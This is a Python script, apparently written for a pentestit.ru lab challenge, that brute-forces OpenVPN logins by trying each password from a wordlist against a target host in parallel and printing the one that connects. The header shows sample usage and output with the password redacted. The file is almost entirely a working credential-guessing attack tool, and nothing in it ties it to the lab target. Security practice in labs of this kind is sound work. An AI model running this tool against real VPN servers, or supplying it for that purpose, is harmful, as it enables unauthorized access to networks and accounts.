'''
@author: s bridgens
@website: https://innogen-security.com/
@linkedin: https://www.linkedin.com/in/simonbridgens/

@Description: This script was made for a challenge on the current pentestit.ru labs v11: https://lab.pentestit.ru/
 I could not get crowbar to work effectively via a kali vm.
 So I decided to give writing my own a go just for the pure fun of it, because why not....

@NOTE: This is a quick script to achieve a purpose not a technical programming excercise not consideration to memory/procs/handling etc has been given!
If you fancy bashing the code because you feel the need to feel superior... dont, just be a good dev and update it...

Test output:

python sb_brute_openvpn.py --host 192.168.101.10 --config /home/scripts/python/server.conf --user Office-2 --passlist /usr/share/john/password.lst 

[+] SUCCESS! command = /usr/sbin/openvpn --remote 192.168.101.10 --config /home/scripts/python/server.conf --auth-user-pass /tmp/sb_test/tmp4HdLuM
[+] Password: ***REMOVED***
[+] VPN Process stopped and temp files removed
Terminated



Challenge for password brute complete.

'''
#!/usr/bin/python
import os
import sys
import argparse
import tempfile
import shlex
import subprocess
import shutil
from multiprocessing.pool import ThreadPool

TOTAL_PROCESSES = 4
TEMP_DIR_PATH = "/tmp/sb_test/"

# colour class credit: spiritnull@sigaint.org
# taken from:
# https://www.exploit-db.com/exploits/41236/
class bcolours:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'        
    

class OpenVpnBruter(object):
    def __init__(self):
        self.parse_options()
        self.build_list()
        self._MT_Process()
        self.cmd_arr
        self.pass_arr
        
    def parse_options(self):
        parser = argparse.ArgumentParser(description="Openvpn Brute forcer built for pentestit lab v11")
        parser.add_argument('--host', type=str, required=True)
        parser.add_argument('--config', type=str, required=True)
        parser.add_argument('--user', type=str, required=True)
        parser.add_argument('--passlist', type=str, required=True)
        self.args = parser.parse_args()
        
    
    
    def _clean_up(self):
        shutil.rmtree(TEMP_DIR_PATH)
        # not a good solution here but one that works
        # due to thread pool defunct objects holding a process
        # and preventing the app closing out using exit(0)
        os.system('kill %d' % os.getpid())
    
    
    def build_list(self):
        if not os.path.exists(TEMP_DIR_PATH): 
            os.makedirs(TEMP_DIR_PATH)
          
        self.cmd_arr = []
        self.pass_arr = []
            
        with open(self.args.passlist) as plist:
            for password in plist:
                try:
                    password=password.strip()
                    tf = tempfile.NamedTemporaryFile(dir=TEMP_DIR_PATH, delete=False)
                    tf.write('{0}\n{1}\n'.format(self.args.user, password))
                    tf.flush()
                    tf.close()
                    self.cmd_arr.append("/usr/sbin/openvpn --remote {0} --config {1} --auth-user-pass {2}".format(self.args.host, self.args.config, tf.name))
                    self.pass_arr.append(password)
                except:
                    raise
        
        
    
    def _start_brute(self, cmd):
        
        process = subprocess.Popen(shlex.split(cmd),
                                       shell=False,
                                       stderr=subprocess.PIPE,
                                       stdout=subprocess.PIPE)
        
        for outline in iter(process.stdout.readline,''):
            if "Initialization Sequence Completed" in outline:
                pass_index=self.cmd_arr.index(cmd)
                password=self.pass_arr[pass_index]
                print (bcolours.BOLD+bcolours.GREEN+"[+] SUCCESS!" +bcolours.ENDC+bcolours.ENDC +" command = "+ bcolours.HEADER +"%s" % (cmd) +bcolours.ENDC)
                print (bcolours.BOLD+"[+] Password:" + bcolours.GREEN + " %s" % (password)+ bcolours.ENDC+ bcolours.ENDC)
                print (bcolours.BOLD +"[+] VPN Process stopped and temp files removed" +bcolours.ENDC)
                self.pool.terminate()
                process.terminate()
                self._clean_up()
                
    
    
    def _MT_Process(self):
        self.pool = ThreadPool(processes=TOTAL_PROCESSES)
        self.pool.map(self._start_brute, self.cmd_arr)
        self.pool.close()
        self.pool.join()
        
    
    
    def main(self):
        self.build_list()
        self._MT_Process()
        print(bcolours.BOLD+bcolours.RED+"[-] FAILED TO FIND OPENVPN PASSWORD :-( "+bcolours.ENDC+bcolours.ENDC)
        self._clean_up()
        

def main():
    brute_openvpn = OpenVpnBruter()
    brute_openvpn.main()

if __name__ == "__main__":
    main()


    
    
